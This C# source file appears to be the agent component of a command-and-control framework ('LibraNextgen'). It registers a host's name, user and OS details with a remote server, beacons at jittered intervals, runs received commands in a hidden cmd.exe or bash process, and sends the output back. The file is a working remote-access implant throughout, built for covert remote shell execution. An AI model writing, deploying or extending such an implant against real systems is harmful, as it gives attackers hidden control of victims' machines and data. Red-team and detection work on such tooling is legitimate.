using System.Text.Json;
using LibraNextgen.Agent.Communication;
using LibraNextgen.Agent.Crypto;

namespace LibraNextgen.Agent.Core;

public class AgentEngine
{
    private readonly ConfigManager _config;
    private readonly AgentCrypto _crypto;
    private ICommunicator _communicator = null!;
    private string _agentId = string.Empty;
    private CancellationTokenSource? _cts;

    public AgentEngine(ConfigManager config, AgentCrypto crypto)
    {
        _config = config;
        _crypto = crypto;
    }

    public async Task RunAsync(CancellationToken cancellationToken = default)
    {
        _cts = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);

        _crypto.GenerateKeyPair();

        var hostname = Environment.MachineName;
        var userName = Environment.UserName;
        var osVersion = Environment.OSVersion.VersionString;
        var arch = Environment.Is64BitOperatingSystem ? "x64" : "x86";

        _communicator = new HttpCommunicator(_config);

        Console.WriteLine($"[Agent] Starting on {hostname}...");

        // Register
        _agentId = await _communicator.RegisterAsync(
            hostname, userName, osVersion, arch, _crypto.RsaPublicKey ?? "", _cts.Token);

        if (string.IsNullOrEmpty(_agentId))
        {
            Console.WriteLine("[Agent] Registration failed. Exiting.");
            return;
        }

        Console.WriteLine($"[Agent] Registered as {_agentId}");

        // Heartbeat loop
        await HeartbeatLoopAsync(_cts.Token);
    }

    private async Task HeartbeatLoopAsync(CancellationToken ct)
    {
        while (!ct.IsCancellationRequested)
        {
            try
            {
                var interval = _config.GetJitteredInterval();
                await Task.Delay(interval, ct);

                var task = await _communicator.HeartbeatAsync(_agentId, ct);
                if (task != null)
                {
                    Console.WriteLine($"[Agent] Received task: {task.CommandType} - {task.Command}");
                    await ExecuteTaskAsync(task, ct);
                }
            }
            catch (TaskCanceledException) { break; }
            catch (Exception ex)
            {
                Console.WriteLine($"[Agent] Heartbeat error: {ex.Message}");
            }
        }
    }

    private async Task ExecuteTaskAsync(LibraNextgen.Common.Models.AgentTask task, CancellationToken ct)
    {
        var output = "";
        var error = "";
        var success = false;

        try
        {
            switch (task.CommandType)
            {
                case Common.Models.CommandType.Shell:
                    output = ExecuteShell(task.Command);
                    success = true;
                    break;
                case Common.Models.CommandType.Sleep:
                    if (int.TryParse(task.Command, out var seconds))
                    {
                        output = $"Sleeping for {seconds}s";
                        success = true;
                        await Task.Delay(seconds * 1000, ct);
                    }
                    break;
                default:
                    output = $"Unknown command type: {task.CommandType}";
                    break;
            }
        }
        catch (Exception ex)
        {
            error = ex.Message;
        }

        var escapedOutput = output.Replace("\\", "\\\\").Replace("\"", "\\\"");
        var escapedError = error.Replace("\\", "\\\\").Replace("\"", "\\\"");
        var resultJson = $"{{\"taskId\":\"{task.Id}\",\"success\":{success.ToString().ToLowerInvariant()},\"output\":\"{escapedOutput}\",\"error\":\"{escapedError}\"}}";
        await _communicator.SubmitResultAsync(_agentId, resultJson, ct);
    }

    private static string ExecuteShell(string command)
    {
        try
        {
            var psi = new System.Diagnostics.ProcessStartInfo
            {
                FileName = Environment.OSVersion.Platform == PlatformID.Win32NT ? "cmd.exe" : "/bin/bash",
                Arguments = Environment.OSVersion.Platform == PlatformID.Win32NT ? $"/c {command}" : $"-c \"{command}\"",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using var process = System.Diagnostics.Process.Start(psi);
            if (process == null) return "Failed to start process";

            var output = process.StandardOutput.ReadToEnd();
            var error = process.StandardError.ReadToEnd();
            process.WaitForExit(30000);

            return string.IsNullOrEmpty(output) ? error : output;
        }
        catch (Exception ex)
        {
            return $"Error: {ex.Message}";
        }
    }
}
